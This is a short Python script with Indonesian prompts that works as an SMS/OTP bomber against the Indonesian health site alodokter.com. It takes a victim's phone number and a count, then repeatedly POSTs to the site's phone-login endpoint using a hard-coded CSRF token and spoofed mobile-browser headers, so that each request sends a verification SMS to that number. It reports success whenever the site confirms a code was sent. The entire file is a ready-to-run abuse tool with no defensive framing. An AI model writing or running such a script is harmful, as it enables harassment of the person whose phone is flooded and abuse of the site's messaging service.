import requests, json
ses=requests.Session()

print("masukan nomer dengan awalan 8**********")
nomer = input("masukan nomer : ")
jumlah = int(input("masukan limit : "))
for z in range(jumlah):
	data = json.dumps({
		"user": {"phone": f"0{nomer}"}})
	headers = {
		"Host": "www.alodokter.com",
		"content-length": "33",
		"x-csrf-token": "UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==",
		"content-type": "application/json",
		"accept": "application/json",
		"save-data": "on",
		"origin": "https://www.alodokter.com",
		"referer": "https://www.alodokter.com/login-alodokter",
		"sec-ch-ua-mobile": "?1",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"accept-encoding": "gzip, deflate, br",
		"accept-language": "id-ID,id;q=0.9,en;q=0.8",
		"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"}
	post = ses.post("https://www.alodokter.com/login-with-phone-number",data=data,headers=headers)
	if "Kami telah mengirim kode verifikasi. Masukkan kode tersebut untuk verifikasi." in post.text:
		print("berhasil")
	else:
		print("gagal, mungkin harus kasih delay")
